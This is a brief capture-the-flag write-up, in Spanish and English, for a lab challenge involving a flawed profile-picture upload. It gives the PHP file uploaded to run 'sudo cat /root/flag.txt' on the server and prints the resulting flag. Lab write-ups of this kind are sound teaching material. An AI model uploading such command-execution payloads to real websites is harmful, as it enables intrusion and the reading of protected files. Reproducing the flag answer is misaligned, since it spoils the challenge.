## Descripción
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory. You can access the web application [here](http://xebec.cylabacademy.net:35617/)!
## Solución
Lo que trata es hacer un script de php que logre obtener la bandera en el root, buscando un codigo tuve uno que es `academy{wh47_c4n_u_d0_wPHP_a93bcbae}` y el codigo de php fue el siguiente 
```
<?php
$command = 'sudo cat /root/flag.txt';
$output = exec($command);
echo "$output";
?>

```
## Notas Adicionales 
## Referencias
